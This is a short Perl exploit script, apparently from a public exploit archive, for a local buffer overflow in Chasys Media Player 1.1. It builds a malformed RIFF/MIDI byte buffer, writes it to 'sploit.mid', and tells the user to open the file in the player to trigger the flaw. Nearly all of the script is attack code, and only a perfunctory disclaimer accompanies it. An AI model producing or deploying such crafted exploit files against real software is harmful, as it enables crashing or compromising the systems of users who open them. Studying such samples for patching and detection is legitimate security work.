#!/usr/bin/perl

# Chasys Media Player 1.1 (.mid) Local Buffer Overflow
# Exploit Coded by: cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>
# From: Indonesia
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING - WARNING - WARNING - WARNING
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#
#
# Disclaimer: The author published the information under the condition
#             that is not in the intention of the reader to use them in order to bring
#             to himself or others a profit or to bring to others damage.
#
#
# Gr33tz: No Thanks


print "
[+]-------------------------------------------------------[+]
[+] Chasys Media Player 1.1 (.mid) Local Buffer Overflow  [+]
[+] By : cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>            [+]
[+]-------------------------------------------------------[+]
";


$buff =
"\x52\x49\x46\x46\xff\xff\x00\x00\x52\x4d\x49\x44\x64\x64\x64\x64" .
"\xf8\xff\xff\xff\x4d\x54\x68\x64\xff\xff\xff\xff\xf8\xff\xff\xf8" .
"\xf8\xff\xff\xff\xf7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" .
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" .
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";

open(file, "> sploit.mid");
print (file $buff);
print "\n\n[+] Done...!!!\n
[+] Open with Chasys Media Player\n
[+] Coded by cr4wl3r\n";